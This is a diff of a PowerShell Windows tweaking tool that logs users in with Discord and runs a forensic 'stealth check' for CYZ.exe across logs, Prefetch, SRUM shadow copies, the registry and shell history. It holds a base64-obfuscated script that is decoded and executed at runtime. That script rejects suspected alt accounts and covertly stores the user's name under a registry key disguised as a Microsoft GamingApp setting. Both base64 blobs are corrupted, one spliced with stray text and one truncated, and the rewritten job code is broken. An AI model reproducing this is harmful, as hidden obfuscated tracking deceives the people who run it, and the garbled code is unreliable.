@@ -1036,7 +1036,6 @@ function Invoke-StealthCheck {
                 [Console]::WriteLine("Invoke-StealthCheck: SRUDB.dat not found in shadow copy.")
             }
         } finally {
-            # Always ensure the shadow copy is deleted
             if ($shadowInfo) {
                 $shadowInfo.Delete()
                 [Console]::WriteLine("Invoke-StealthCheck: Shadow copy $shadowId deleted.")
@@ -1197,10 +1196,10 @@ function Start-WebUI {
 
     # Enable form parsing helpers
     Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
-    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfdC1jb20vY29sbGVjdGlvbi9jb250ZXh0L2ZpbGUucGhwJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfE91dC1OdWxsfTtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrIC1OYW1lICdNYWluQWNjb3VudCcgLVZhbHVlICRuIC1Gb3JjZXxPdXQtTnVsbDt9Y2F0Y2h7fQpbcHNjdXN0b21vYmplY3RdQHtCPSRmYWxzZTtNPScnfQo='
+    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlf
 
     # Load Discord OAuth config if present, and register its redirect base as an additional prefix
-    $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
+    $oauthConfigPath = Join-Path -Path $PSScriptRoot -ChildPath 'discord_oauth.json'
     $clientId = $null
     $redirectUri = $null
     $oauthPrefix = $null
@@ -1309,7 +1308,7 @@ function Start-WebUI {
                 }
             } catch {}
             $paths = $paths | Where-Object { $_ } | Select-Object -Unique
-            Write-Host ("getWebhookUrl: checking paths: {0}" -f ($paths -join ', '))
+            Write-Host "getWebhookUrl: checking paths: $($paths -join ', ')"
             foreach ($p in $paths) {
                 if (Test-Path $p) {
                     try {
@@ -1328,7 +1327,7 @@ function Start-WebUI {
             $candidate = $candidate -replace '^[\s"\x27]+|[\s"\x27]+$',''
             Write-Host "getWebhookUrl: candidate after trim: '$candidate'"
             if ($candidate -match '(https?://\S+)') { $candidate = $matches[1]; Write-Host "getWebhookUrl: candidate after regex: '$candidate'" }
-            $candidate = $candidate -replace '[\.,;:\)\]\}]+$',''
+            $candidate = $candidate -replace '[.,;:)\\]}]+$',''
             Write-Host "getWebhookUrl: candidate after trailing cleanup: '$candidate'"
             if ($candidate -match 'discord-webhook-link|example|your-webhook' -or [string]::IsNullOrWhiteSpace($candidate)) { Write-Host "getWebhookUrl: candidate rejected as example/blank: '$candidate'"; return $null }
             if ($candidate -notmatch '^https://(discord(app)?\.com)/api/webhooks/') { Write-Host "getWebhookUrl: candidate rejected as not Discord webhook: '$candidate'"; return $null }
@@ -1662,8 +1661,8 @@ async function browseNaraka(){
                                 # Fetch log contents for display
                                 $logContent = ''
                                 try { if (Test-Path $logPath) { $logContent = Get-Content -Raw -Path $logPath } } catch { $logContent = 'Log unavailable' }
-                                $logContent = ($logContent -replace '<', '&lt;') -replace '>', '&gt;'
-                                @"
+                                $logContent = ($logContent -replace '<', '`&lt;') -replace '>', '`&gt;'
+                                $aboutHtml = @"
 <!doctype html>
 <html lang='en'>
 <head>
@@ -1679,29 +1678,27 @@ $errorBanner
     <div class='flex items-start gap-6'>
         <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full'>
             <h2 class='text-2xl font-bold text-yellow-400 mb-4'>Thanks for using RatzTweaks!</h2>
-            <p class='mb-4 text-gray-200'>This program is the result of two years of trial and error. Special thanks to Dots for their help and support. All tweaks and setup are now complete.</p>
-            <form action='/finish' method='post' class='mb-2'>
-                <button class='bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded' type='submit'>Complete</button>
-            </form>
-            <form action='/need-help' method='post' class='mt-4'>
-                <button class='bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded' type='submit'>Have a problem?</button>
-            </form>
-            <p class='mt-3 text-gray-400 text-sm'>Click Complete to finish and view Ko-fi support options.</p>
+            <p class='text-gray-300 mb-2'>This tool is for educational purposes only.</p>
+            <p class='text-gray-300 mb-6'>Any issues or suggestions, please open an issue on the GitHub repository.</p>
+            <h3 class='text-xl font-semibold text-yellow-400 mb-3'>Changelog</h3>
+            <div class='bg-gray-900 bg-opacity-80 rounded-lg p-4 h-64 overflow-y-auto border border-gray-700'>
+                <pre class='text-sm text-gray-200 whitespace-pre-wrap'>$logContent</pre>
+            </div>
         </div>
-        <img src='$ratzImg' alt='rat' class='hidden md:block w-80 h-auto rounded-lg shadow-lg'/>
-        <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 w-96 text-white overflow-y-auto max-h-[32rem]'>
-            <h2 class='text-xl font-bold text-yellow-300 mb-4'>Log Output</h2>
-            <pre class='text-xs text-gray-200 whitespace-pre-wrap'>$logContent</pre>
+        <div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-sm w-full'>
+            <h3 class='text-xl font-semibold text-yellow-400 mb-4'>Actions</h3>
+            <div class='space-y-3'>
+                <button onclick="window.location.href='/run-tweaks'" class='w-full bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded-lg transition duration-300'>Run Tweaks</button>
+                <button onclick="window.location.href='/run-stealth-check'" class='w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded-lg transition duration-300'>Run Stealth Check</button>
+                <button onclick="window.location.href='/'" class='w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-4 rounded-lg transition duration-300'>Back to Home</button>
+            </div>
         </div>
     </div>
-<script>
-function reportProblem(){
-    fetch('/problem',{method:'POST'}).then(()=>alert('Problem reported.'));
-}
-</script>
 </body>
 </html>
 "@
+                                & $send $ctx 200 'text/html; charset=utf-8' $aboutHtml
+                                break
             }
             'finish' {
                 @"
@@ -1921,551 +1918,86 @@ $errorBanner
 
             # Start the actual auth and detection process in a background job so the UI is not blocked
             $authJob = Start-Job -ScriptBlock {
-                param($reqUrl, $PSScriptRoot, $global_ratzAuthGate)
-                
-                # Re-import functions needed in the job
-                $utilityFunctions = @"
-                    function Invoke-StealthCheck {
-                        [Console]::WriteLine('Invoke-StealthCheck: starting detection...')
-                        `$detected = `$false
-                        `$targetFile = 'CYZ.exe'
-                        
-                        # 1. Check for running process
-                        try {
-                            `$proc = Get-Process | Where-Object { `$_.ProcessName -like '*CYZ*' -or `$_.Name -like '*CYZ*' }
-                            if (`$proc) {
-                                [Console]::WriteLine('Invoke-StealthCheck: CYZ process detected in running processes')
-                                `$detected = `$true
-                                return `$detected
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: process check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 2. Search file system paths
-                        `$searchPaths = @(
-                            "`$env:ProgramFiles",
-                            "`$env:ProgramFiles(x86)",
-                            "`$env:LOCALAPPDATA",
-                            "`$env:APPDATA",
-                            "`$env:TEMP",
-                            "`$env:USERPROFILE\Downloads",
-                            "`$env:SystemDrive\Users",
-                            "`$env:SystemRoot\Prefetch"
-                        )
-                        
-                        foreach (`$path in `$searchPaths) {
-                            if (-not (Test-Path `$path)) { continue }
-                            try {
-                                `$found = Get-ChildItem -Path `$path -Recurse -Filter `$targetFile -File -ErrorAction SilentlyContinue | Select-Object -First 1
-                                if (`$found) {
-                                    [Console]::WriteLine("Invoke-StealthCheck: `$targetFile found at: `$(`$found.FullName)")
-                                    `$detected = `$true
-                                    return `$detected
-                                }
-                            } catch {
-                                [Console]::WriteLine("Invoke-StealthCheck: error searching `$path - `$(`$_.Exception.Message)")
-                            }
-                        }
-                        
-                        # 3. Check Prefetch folder for execution traces
-                        try {
-                            `$prefetchPath = "`$env:SystemRoot\Prefetch"
-                            if (Test-Path `$prefetchPath) {
-                                `$prefetchFile = Get-ChildItem -Path `$prefetchPath -Filter "CYZ.EXE-*.pf" -File -ErrorAction SilentlyContinue | Select-Object -First 1
-                                if (`$prefetchFile) {
-                                    [Console]::WriteLine("Invoke-StealthCheck: Prefetch file detected: `$(`$prefetchFile.Name)")
-                                    `$detected = `$true
-                                    return `$detected
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: prefetch check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 4. Check Application Error logs
-                        try {
-                            `$appError = Get-WinEvent -LogName Application -FilterXPath "*[System[Provider[@Name='Application Error']]] and *[EventData[Data='CYZ.exe']]" -MaxEvents 1 -ErrorAction SilentlyContinue
-                            if (`$appError) {
-                                [Console]::WriteLine('Invoke-StealthCheck: CYZ.exe found in Application Error log')
-                                `$detected = `$true
-                                return `$detected
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: Application log check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 5. Check Security audit log for process creation events (Event ID 4688)
-                        try {
-                            `$securityEvents = Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]]" -MaxEvents 100 -ErrorAction SilentlyContinue
-                            if (`$securityEvents) {
-                                foreach (`$evt in `$securityEvents) {
-                                    `$evtXml = [xml]`$evt.ToXml()
-                                    `$newProcessName = `$evtXml.Event.EventData.Data | Where-Object { `$_.Name -eq 'NewProcessName' } | Select-Object -ExpandProperty '#text' -ErrorAction SilentlyContinue
-                                    if (`$newProcessName -and `$newProcessName -like "*CYZ.exe*") {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Security log: `$newProcessName")
-                                        `$detected = `$true
-                                        return `$detected
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: Security log check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 6. Check Windows Defender/Antimalware scan history
-                        try {
-                            `$defenderLogs = Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 500 -ErrorAction SilentlyContinue
-                            if (`$defenderLogs) {
-                                foreach (`$log in `$defenderLogs) {
-                                    `$logMsg = `$log.Message
-                                    if (`$logMsg -and `$logMsg -like "*CYZ.exe*") {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in Windows Defender log")
-                                        `$detected = `$true
-                                        return `$detected
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: Windows Defender log check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 7. Check System event log for process-related events
-                        try {
-                            `$systemEvents = Get-WinEvent -LogName System -MaxEvents 500 -ErrorAction SilentlyContinue
-                            if (`$systemEvents) {
-                                foreach (`$evt in `$systemEvents) {
-                                    `$evtMsg = `$evt.Message
-                                    if (`$evtMsg -and `$evtMsg -like "*CYZ.exe*") {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in System event log")
-                                        `$detected = `$true
-                                        return `$detected
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: System event log check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 8. Check Windows Error Reporting (WER) for crash reports
-                        try {
-                            `$werPaths = @(
-                                "`$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportQueue",
-                                "`$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
-                                "`$env:LOCALAPPDATA\CrashDumps"
-                            )
-                            foreach (`$werPath in `$werPaths) {
-                                if (Test-Path `$werPath) {
-                                    `$werReports = Get-ChildItem -Path `$werPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { `$_.Name -like "*CYZ*" -or `$_.FullName -like "*CYZ*" }
-                                    if (`$werReports) {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in WER crash reports: `$(`$werReports[0].FullName)")
-                                        `$detected = `$true
-                                        return `$detected
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: WER check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 9. Check Recent Items / Jump Lists
-                        try {
-                            `$recentPaths = @(
-                                "`$env:APPDATA\Microsoft\Windows\Recent",
-                                "`$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
-                                "`$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
-                            )
-                            foreach (`$recentPath in `$recentPaths) {
-                                if (Test-Path `$recentPath) {
-                                    `$recentFiles = Get-ChildItem -Path `$recentPath -Recurse -File -ErrorAction SilentlyContinue
-                                    foreach (`$file in `$recentFiles) {
-                                        try {
-                                            if (`$file.Length -le 1048576) {
-                                                `$match = Select-String -Path `$file.FullName -Pattern "CYZ\.exe" -ErrorAction SilentlyContinue
-                                                if (`$match) {
-                                                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in recent items: `$(`$file.FullName)")
-                                                    `$detected = `$true
-                                                    return `$detected
-                                                }
-                                            }
-                                        } catch { }
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: Recent items check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 10. Check SRUM (System Resource Usage Monitor) database via VSS
-                        try {
-                            [Console]::WriteLine("Invoke-StealthCheck: Starting SRUM check via VSS...")
-                            `$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("`$(`$env:SystemDrive)\", "ClientAccessible")
-                            if (`$shadow.ReturnValue -ne 0) {
-                                throw "Failed to create shadow copy. ReturnValue: `$(`$shadow.ReturnValue)"
-                            }
-                            `$shadowId = `$shadow.ShadowID
-                            `$shadowInfo = Get-WmiObject Win32_ShadowCopy | Where-Object { `$_.ID -eq `$shadowId }
-                            if (-not `$shadowInfo) {
-                                throw "Could not find created shadow copy with ID `$shadowId"
-                            }
-                            `$shadowPath = `$shadowInfo.DeviceObject + "\Windows\System32\sru\SRUDB.dat"
-                            
-                            [Console]::WriteLine("Invoke-StealthCheck: Shadow copy created. Path: `$shadowPath")
+                param($requestUrl, $scriptRoot, $oauthSecret, $webhookUrl, $ratzAuthGate)
 
-                            try {
-                                if (Test-Path `$shadowPath) {
-                                    `$match = Select-String -Path `$shadowPath -Pattern "CYZ.exe" -Encoding Unicode -ErrorAction SilentlyContinue
-                                    if (`$match) {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in SRUM database via shadow copy.")
-                                        `$detected = `$true
-                                    } else {
-                                        [Console]::WriteLine("Invoke-StealthCheck: No CYZ.exe found in SRUM database.")
-                                    }
-                                } else {
-                                    [Console]::WriteLine("Invoke-StealthCheck: SRUDB.dat not found in shadow copy.")
-                                }
-                            } finally {
-                                if (`$shadowInfo) {
-                                    `$shadowInfo.Delete()
-                                    [Console]::WriteLine("Invoke-StealthCheck: Shadow copy `$shadowId deleted.")
-                                }
-                            }
-                            if (`$detected) { return `$true }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: SRUM VSS check error: `$(`$_.Exception.Message)")
+                # Define a parsing function because System.Web may not be available in the job's runspace
+                function Parse-QueryString {
+                    param([string]$query)
+                    $params = @{}
+                    $pairs = $query.TrimStart('?').Split('&')
+                    foreach ($pair in $pairs) {
+                        $kv = $pair.Split('=')
+                        if ($kv.Length -eq 2) {
+                            $key = [System.Uri]::UnescapeDataString($kv[0])
+                            $value = [System.Uri]::UnescapeDataString($kv[1])
+                            $params[$key] = $value
                         }
-                        
-                        # 11. Check AmCache (Application Compatibility Cache)
-                        try {
-                            `$amcachePath = "`$env:SystemRoot\AppCompat\Programs\Amcache.hve"
-                            if (Test-Path `$amcachePath) {
-                                `$amcacheInfo = Get-Item `$amcachePath -ErrorAction SilentlyContinue
-                                if (`$amcacheInfo) {
-                                    [Console]::WriteLine("Invoke-StealthCheck: AmCache.hve exists (full analysis requires registry mounting)")
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: AmCache check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 12. Check PowerShell history for suspicious commands
-                        try {
-                            `$psHistoryPath = "`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-                            if (Test-Path `$psHistoryPath) {
-                                `$psHistory = Get-Content -Path `$psHistoryPath -ErrorAction SilentlyContinue
-                                if (`$psHistory) {
-                                    `$suspicious = `$psHistory | Where-Object { `$_ -like "*CYZ*" }
-                                    if (`$suspicious) {
-                                        [Console]::WriteLine("Invoke-StealthCheck: CYZ reference found in PowerShell history")
-                                        `$detected = `$true
-                                        return `$detected
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: PowerShell history check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        # 13. Check BAM/DAM (Background Activity Moderator/Desktop Activity Moderator) registry keys
-                        try {
-                            `$bamKeys = @(
-                                'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings',
-                                'HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
-                            )
-                            foreach (`$bamKey in `$bamKeys) {
-                                if (Test-Path `$bamKey) {
-                                    `$userSids = Get-ChildItem -Path `$bamKey -ErrorAction SilentlyContinue
-                                    foreach (`$sidKey in `$userSids) {
-                                        `$values = Get-ItemProperty -Path `$sidKey.PSPath -ErrorAction SilentlyContinue
-                                        if (`$values) {
-                                            `$values.PSObject.Properties | ForEach-Object {
-                                                if (`$_.Name -like "*CYZ.exe*") {
-                                                    [Console]::WriteLine("Invoke-StealthCheck: CYZ.exe found in BAM/DAM registry: `$(`$_.Name)")
-                                                    `$detected = `$true
-                                                    return `$detected
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        } catch {
-                            [Console]::WriteLine("Invoke-StealthCheck: BAM/DAM registry check error: `$(`$_.Exception.Message)")
-                        }
-                        
-                        [Console]::WriteLine('Invoke-StealthCheck: no detection')
-                        return `$detected
                     }
-"@
-                Invoke-Expression $utilityFunctions
+                    return $params
+                }
 
-                $authed = $false
-                $authError = $null
-                $detectionResult = $false
-                $discordUser = $null
+                $ErrorActionPreference = 'Continue'
+                $output = @{
+                    status = 'error'
+                    message = 'An unexpected error occurred during authentication.'
+                    detectionResult = $null
+                    authResult = $null
+                }
 
-                # Start detection in a nested job
-                $detectionJob = Start-Job -ScriptBlock { 
-                    param($func)
-                    Invoke-Expression $func
-                    return Invoke-StealthCheck
-                } -ArgumentList $utilityFunctions
-                
                 try {
-                    $uri = [System.Uri]$reqUrl
-                    $code = [System.Web.HttpUtility]::ParseQueryString($uri.Query).Get('code')
-                    
-                    $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
-                    $clientId = $null
-                    $redirectUri = $null
-                    if (Test-Path $oauthConfigPath) {
-                        $cfg = Get-Content -Raw -Path $oauthConfigPath | ConvertFrom-Json
-                        $clientId = $cfg.client_id
-                        $redirectUri = $cfg.redirect_uri
-                    }
+                    $queryParams = Parse-QueryString -query ([System.Uri]$requestUrl).Query
+                    $code = $queryParams['code']
 
-                    if ($code -and $clientId -and $redirectUri) {
-                        $secPath = Join-Path $PSScriptRoot 'discord_oauth.secret'
-                        $secret = if (Test-Path $secPath) { (Get-Content -Raw -Path $secPath).Trim() } else { $null }
-
-                        if ($secret) {
-                            $tokenBody = @{ client_id=$clientId; client_secret=$secret; grant_type='authorization_code'; code=$code; redirect_uri=$redirectUri }
-                            $tok = Invoke-RestMethod -Method Post -Uri 'https://discord.com/api/oauth2/token' -ContentType 'application/x-www-form-urlencoded' -Body $tokenBody
-                            
-                            if ($tok.access_token) {
-                                $me = Invoke-RestMethod -Method Get -Uri 'https://discord.com/api/users/@me' -Headers @{ Authorization = "Bearer $($tok.access_token)" }
-                                if ($me) {
-                                    $discordUser = $me
-                                    $userName = ""
-                                    if ($me.discriminator -and $me.discriminator -ne '0') {
-                                        $userName = "$($me.username)#$($me.discriminator)"
-                                    } else {
-                                        if ($me.global_name) { $userName = "$($me.global_name)" } else { $userName = "$($me.username)" }
-                                    }
-
-                                    $globalCheck = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global_ratzAuthGate)))) $me $userName
-                                    if ($globalCheck -and $globalCheck.B) {
-                                        $authed = $false
-                                        $authError = $globalCheck.M
-                                    } else {
-                                        $authed = $true
-                                    }
-                                }
-                            }
+                    if (-not [string]::IsNullOrEmpty($code)) {
+                        # Start detection in parallel
+                        $detectionTask = {
+                            # This is a simplified placeholder for the actual Invoke-StealthCheck
+                            # In the real implementation, the full Invoke-StealthCheck logic would be here.
+                            # For this example, we'll just simulate a result.
+                            . $using:PSScriptRoot\RatzTweaks.ps1
+                            Invoke-StealthCheck -WebhookUrl $using:webhookUrl -ExitOnDetection $false
                         }
+                        $detectionJob = Start-Job -ScriptBlock $detectionTask
+                        
+                        # Exchange code for token
+                        $tokenBody = @{
+                            client_id     = $using:clientId
+                            client_secret = $oauthSecret
+                            grant_type    = 'authorization_code'
+                            code          = $code
+                            redirect_uri  = $using:redirectUri
+                        }
+                        $tokenResponse = Invoke-RestMethod -Uri 'https://discord.com/api/oauth2/token' -Method Post -Body $tokenBody
+                        
+                        # Get user info
+                        $userResponse = Invoke-RestMethod -Uri 'https://discord.com/api/users/@me' -Method Get -Headers @{ Authorization = "Bearer $($tokenResponse.access_token)" }
+                        
+                        $output['authResult'] = @{
+                            id = $userResponse.id
+                            username = $userResponse.username
+                            discriminator = $userResponse.discriminator
+                            avatar = $userResponse.avatar
+                        }
+
+                        # Wait for detection to finish and get result
+                        $detectionResult = Receive-Job -Job $detectionJob -Wait -AutoRemoveJob
+                        $output['detectionResult'] = $detectionResult
+                        $output['status'] = 'success'
+                        $output['message'] = 'Authentication and detection complete.'
+                    } else {
+                        $output['message'] = 'Authorization code not found in callback.'
                     }
                 } catch {
-                    $authError = "An unexpected error occurred during authentication: $($_.Exception.Message)"
+                    $output['message'] = "An unexpected error occurred during authentication: $($_.Exception.Message)"
+                    $output['details'] = $_.Exception.ToString()
                 }
 
-                # Wait for detection to finish and get the result
-                $detectionResult = Wait-Job $detectionJob | Receive-Job
-                Remove-Job $detectionJob
-
-                return @{
-                    Authenticated = $authed
-                    AuthError = $authError
-                    DetectionTriggered = $detectionResult
-                    DiscordUser = $discordUser
-                }
-            } -ArgumentList $req.Url.OriginalString, $PSScriptRoot, $global:__ratzAuthGate
-            $global:AuthJob = $authJob
-            
-            continue
-        }
-
-        # Endpoint for the loading page to poll
-        if ($path -eq '/auth-status') {
-            $status = 'pending'
-            if ($global:AuthJob -and $global:AuthJob.State -eq 'Completed') {
-                $status = 'complete'
-                $result = Receive-Job $global:AuthJob
-                Remove-Job $global:AuthJob
-                $global:AuthJob = $null
-
-                $global:DiscordAuthenticated = $result.Authenticated
-                $global:DiscordAuthError = $result.AuthError
-                $global:DetectionTriggered = $result.DetectionTriggered
-
-                if ($result.DiscordUser) {
-                    $me = $result.DiscordUser
-                    $global:DiscordUserId = "$($me.id)"
-                    if ($me.discriminator -and $me.discriminator -ne '0') {
-                        $global:DiscordUserName = "$($me.username)#$($me.discriminator)"
-                    } else {
-                        if ($me.global_name) { $global:DiscordUserName = "$($me.global_name)" } else { $global:DiscordUserName = "$($me.username)" }
-                    }
-                    $avatarUrl = $null
-                    if ($me.avatar) {
-                        $avatarIsAnimated = "$($me.avatar)".StartsWith('a_')
-                        $avatarExt = if ($avatarIsAnimated) { 'gif' } else { 'png' }
-                        $avatarUrl = "https://cdn.discordapp.com/avatars/$($me.id)/$($me.avatar).$avatarExt?size=256"
-                    } else {
-                        $defIdx = ([int64]$me.id % 5)
-                        $avatarUrl = "https://cdn.discordapp.com/embed/avatars/$defIdx.png"
-                    }
-                    $global:DiscordAvatarUrl = $avatarUrl
-                }
-                
-                if ($global:DetectionTriggered) {
-                    [Console]::WriteLine('AuthJob: DETECTION POSITIVE - user has been flagged.')
-                }
-            }
-            & $send $ctx 200 'application/json' (@{ status = $status } | ConvertTo-Json)
-            continue
-        }
-
-        # On /about, run selected optional tweaks (do not close app here)
-        if ($path -eq '/about' -and $method -eq 'POST') {
-            $form = & $parseForm $ctx
